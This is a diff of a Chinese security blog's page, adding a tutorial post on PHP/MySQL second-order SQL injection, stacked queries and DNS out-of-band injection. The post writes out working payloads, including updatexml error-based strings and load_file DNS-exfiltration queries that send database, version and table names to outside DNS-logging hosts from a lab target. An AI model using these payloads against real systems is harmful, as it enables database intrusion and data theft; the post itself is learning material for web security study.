@@ -7,16 +7,20 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Cypher Sun">
-<meta property="og:url" content="http://example.com/index.html">
+<meta name="description" content="PHP-MYSQL-二次注入-DEMO&amp;74CMS DEMO-用户注册登录修改密码 CMS-74CMS个人中心简历功能  黑盒思路：分析代码功能，有INSERT后对数据操作的地方（功能点）白盒思路：INSERT后进入SELECT或UPDATE的功能的代码部分注入条件：插入时有转义的函数或配置，能过后续继续利用INSERT的数据 登录后修改，系统会直接直接获取当前登录的用户名当修改条件 如果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP应用&amp;SQL二次注入&amp;堆叠执行&amp;DNS带外&amp;功能点&amp;黑白盒条件">
+<meta property="og:url" content="http://example.com/2024/03/21/Web%E6%94%BB%E9%98%B25/index.html">
 <meta property="og:site_name" content="Cypher Sun">
+<meta property="og:description" content="PHP-MYSQL-二次注入-DEMO&amp;74CMS DEMO-用户注册登录修改密码 CMS-74CMS个人中心简历功能  黑盒思路：分析代码功能，有INSERT后对数据操作的地方（功能点）白盒思路：INSERT后进入SELECT或UPDATE的功能的代码部分注入条件：插入时有转义的函数或配置，能过后续继续利用INSERT的数据 登录后修改，系统会直接直接获取当前登录的用户名当修改条件 如果">
 <meta property="og:locale">
+<meta property="article:published_time" content="2024-03-20T21:14:30.000Z">
+<meta property="article:modified_time" content="2024-03-20T21:40:16.229Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
 
-<title >Cypher Sun</title>
+<title >PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件</title>
 
 <!-- Favicon -->
 
@@ -53,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":false,"isHome":true,"postUpdate":"2024-03-21 05:55:52"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-21 05:40:16"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -130,7 +134,7 @@
     <nav>
         <ul>
             
-            <li class="menu-item-has-children current-menu-item">
+            <li class="menu-item-has-children ">
                 <a  href="/" target="">
                     首页
                 </a>
@@ -197,16 +201,14 @@
             <!-- top bar end -->
 
             <!-- body -->
-            <div class="trm-content-start">
+            
+<div class="trm-content-start">
     <!-- banner -->
     <div class="trm-banner">
     
-    <!-- banner video cover -->
-    <video autoplay="autoplay" loop muted playsinline webkit-playinginline class="trm-banner-cover">
-        <source src="https://cdn.moji.com/websrc/video/video621.mp4" type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"'>
-        Your browser does not support HTML5 video.
-    </video>
-    <!-- banner video cover end -->
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/null">
+    <!-- banner cover end -->
     
 
     <!-- banner content -->
@@ -221,10 +223,10 @@
                     <!-- banner title -->
                     <div class="trm-banner-text ">
                         <div class="trm-label trm-mb-20">
-                            Welcome to my blog!
+                            
                         </div>
                         <h1 class="trm-mb-30 trm-hsmb-font">
-                            吾日百省，<br>知行合一。
+                            PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件
                         </h1>
 
                         
@@ -234,7 +236,7 @@
                                 </li>
                                 <li>
                                     <span>
-                                        index.html
+                                        2024
                                     </span>
                                 </li>
                             </ul>
@@ -353,62 +355,79 @@
             
             <div class="trm-page-content col-lg-8">
                 <div id="trm-content" class="trm-content">
-                    <!-- categories -->
-
-    <div class="row hidden-sm">
-        
-        
-        <div class="col-lg-6">
-            <!-- categories card -->
-<div class="trm-blog-categories trm-scroll-animation">
-    <h6>
-        工具
-        <span class="trm-number">
-            14
-        </span>
-    </h6>
-    <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-    <a href="/categories/%E5%B7%A5%E5%85%B7/." class="trm-label">
-        查看分类 
-        <i class="iconfont fas fa-arrow-right arrow-right"></i>
-    </a>
-</div>
-<!-- categories card end -->
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/21
         </div>
-        
-        <div class="col-lg-6">
-            <!-- categories card -->
-<div class="trm-blog-categories trm-scroll-animation">
-    <h6>
-        信息打点
-        <span class="trm-number">
-            10
-        </span>
-    </h6>
-    <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-    <a href="/categories/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/." class="trm-label">
-        查看分类 
-        <i class="iconfont fas fa-arrow-right arrow-right"></i>
-    </a>
-</div>
-<!-- categories card end -->
-        </div>
-        
     </div>
-
-<!-- categories end -->
-
-<!-- newest publications -->
-<div class="row">
-    
-        <div class="col-lg-12">
-            <!-- title -->
-            <h5 class="trm-title-with-divider">
-                最近发布 
-                <span data-number="01"></span>
-            </h5>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            05:14
         </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            Cypher Sun
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="PHP-MYSQL-二次注入-DEMO-74CMS"><a href="#PHP-MYSQL-二次注入-DEMO-74CMS" class="headerlink" title="PHP-MYSQL-二次注入-DEMO&amp;74CMS"></a>PHP-MYSQL-二次注入-DEMO&amp;74CMS</h2><ol>
+<li>DEMO-用户注册登录修改密码</li>
+<li>CMS-74CMS个人中心简历功能</li>
+</ol>
+<p><strong>黑盒思路</strong>：分析代码功能，有INSERT后对数据操作的地方（功能点）<br><strong>白盒思路</strong>：INSERT后进入SELECT或UPDATE的功能的代码部分<br><strong>注入条件</strong>：插入时有转义的函数或配置，能过后续继续利用INSERT的数据<br><br></p>
+<p>登录后修改，系统会直接直接获取当前登录的用户名当修改条件</p>
+<p>如果此用户名在注册的时候是SQL注入语句，就能过提前将代码插入到数据中，然后当系统调用数据的时候，连接形成二次注入语句。需要注意，如果对面代码开了转移的函数，无法插入数据</p>
+<br>
+
+<p><strong>关键点</strong>：在插入的时候需要函数转义或者魔术开关转义，没有的话INSERT注入语句就都注入不进去</p>
+<p>首先得知道有没有转义，然后知道有没有单引号，括号，然后插入进去再找在哪触发，一般是看源码代码审计发现的。<br><br></p>
+<p>原本SQL语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO <span class="built_in">users</span>(username，password) VALUES (<span class="string">&#x27;username&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>将在用户名处写的注入语句带入原本SQL语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#&#x27;, $password&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>但是写入之后，#注释掉了之后的内容，导致password的参数传不上去，就会报错。但是如果去掉了单引号和后面的#号，这个注入语句能写入，但是是以字符串的形式写入的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，系统将<code>admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code>作为账号存入数据库</p>
+<p>函数转义或者魔术开关本意是为了拦截一次注入的，会将单引号前面加上\，注释掉单引号使攻击语句出错，但是这样就给了二次注入机会来插入到数据库中，然后再调用的数据的时候触发语句达成目的<br><br></p>
+<h2 id="PHP-MYSQL-堆叠注入-DEMO-CTF强网"><a href="#PHP-MYSQL-堆叠注入-DEMO-CTF强网" class="headerlink" title="PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网"></a>PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网</h2><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句</p>
+<p>例如PHP中的mysqli_multi_query函数和mysqli_query()函数。</p>
+<p>所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数，根据数据库类型决定是否支持多条语句执行.<br><br><br>例如：<br>10.0.1.139:80&#x2F;sqli&#x2F;test.php?id&#x3D;1;create table cypher(personalid int);<br><br></p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p>
+<p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql等</p>
+<h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><p>0.注入条件<br>ROOT高权限且支持load_file()，需要同时满足两个要求，条件太苛刻了<br>有部分注入点是没有回显的，所有读取也是没回显的，所以采用带外</p>
+<p>1.使用平台<br><a target="_blank" rel="noopener" href="https://dig.pm/">https://dig.pm/</a><br>2.带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：</p>
+<p>select load_file(concat(‘\\‘,(select database()),’.7logee.dnslog.cn\aa’));</p>
+<p>union select 1,2,3,load_file(“d:\1.txt”),5,6</p>
+<p>查询当前数据库<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.d7a64120ce.ipv6.1433.eu.org&#x2F;abc’)))</p>
+<p>查询当前版本<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select version()),’.ac45c0ae7c.ipv6.1433.eu.org&#x2F;abc’)))</p>
+<p>查询其他数据库<br>id&#x3D;1 and load_file(concat(“\\“,(select schema_name from information_schema.schemata limit 0,1),”.dbuh8a.ceye.io\xxx.txt”))</p>
+<p>查询当前数据库demo01中第一个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 0,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
+<p>查询当前数据库demo01中第二个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 1,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
+<p>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名</p>
+
+</article>
     
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
     
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
@@ -444,39 +463,6 @@
     </div>
 </div>
     
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/21/Web%E6%94%BB%E9%98%B25/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">21</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/21/Web%E6%94%BB%E9%98%B25/" class="trm-anima-link">
-                    PHP应用&amp;SQL二次注入&amp;堆叠执行&amp;DNS带外&amp;功能点&amp;黑白盒条件
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/21</li>
-                <li>05:14</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
     
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
@@ -512,251 +498,10 @@
     </div>
 </div>
     
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/17/Web%E6%94%BB%E9%98%B24/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">17</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/17/Web%E6%94%BB%E9%98%B24/" class="trm-anima-link">
-                    PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/17</li>
-                <li>22:42</li>
-                
-                
-            </ul>
-        </div>
-    </div>
 </div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/17/Web%E6%94%BB%E9%98%B23/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">17</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/17/Web%E6%94%BB%E9%98%B23/" class="trm-anima-link">
-                    PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/17</li>
-                <li>04:06</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/15/Web%E6%94%BB%E9%98%B22/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">15</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/15/Web%E6%94%BB%E9%98%B22/" class="trm-anima-link">
-                    PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/15</li>
-                <li>22:00</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">15</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/%E5%B7%A5%E5%85%B7/">
-                    工具
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/" class="trm-anima-link">
-                    Sqlmap
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/15</li>
-                <li>03:54</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">15</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/%E5%B7%A5%E5%85%B7/">
-                    工具
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/" class="trm-anima-link">
-                    IIS_shortname_Scanner-master
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/15</li>
-                <li>03:50</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/15/%E5%B7%A5%E5%85%B77kbscan-WebPathBrute/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">15</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/%E5%B7%A5%E5%85%B7/">
-                    工具
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/15/%E5%B7%A5%E5%85%B77kbscan-WebPathBrute/" class="trm-anima-link">
-                    7kbscan-WebPathBrute
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/15</li>
-                <li>00:00</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/14/Web%E6%94%BB%E9%98%B21/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <div class="trm-cover-date">
-                    <div class="trm-cover-day">14</div>
-                    <div class="trm-cover-month">2024/03</div>
-                </div>
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/03/14/Web%E6%94%BB%E9%98%B21/" class="trm-anima-link">
-                    ASP应用&amp;HTTP.SYS&amp;短文件&amp;文件解析&amp;Access注入&amp;数据库泄漏
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/03/14</li>
-                <li>23:49</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
-    
-</div>
-<!-- newest publications end -->
 
+    
 
-    <div class="trm-pagination">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a>
-    </div>
 
 
                     <div class="trm-divider footer-divider"></div>
@@ -808,6 +553,10 @@
             
 <div class="trm-fixed-container">
     
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
     
     
         <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
@@ -890,6 +639,10 @@
     
 
     <!-- 评论插件 -->
+    
+        
+
+        
     
 
 
